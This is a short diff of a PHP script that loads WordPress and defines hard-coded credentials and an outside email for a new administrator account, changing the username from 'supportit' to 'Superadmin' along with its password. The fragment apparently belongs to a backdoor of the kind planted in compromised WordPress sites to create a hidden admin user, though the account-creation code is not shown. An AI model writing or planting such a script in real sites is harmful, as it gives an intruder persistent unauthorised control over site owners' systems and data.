@@ -3,8 +3,8 @@
 require_once('wp-load.php');
 
 // Define new admin user details
-$new_username = 'supportit';
-$new_password = '@bagindangngana12_';
+$new_username = 'Superadmin';
+$new_password = '@Superadminsupport8459';
 $new_email = 'loadmail@gmail.com';
 
 // Check if user already exists
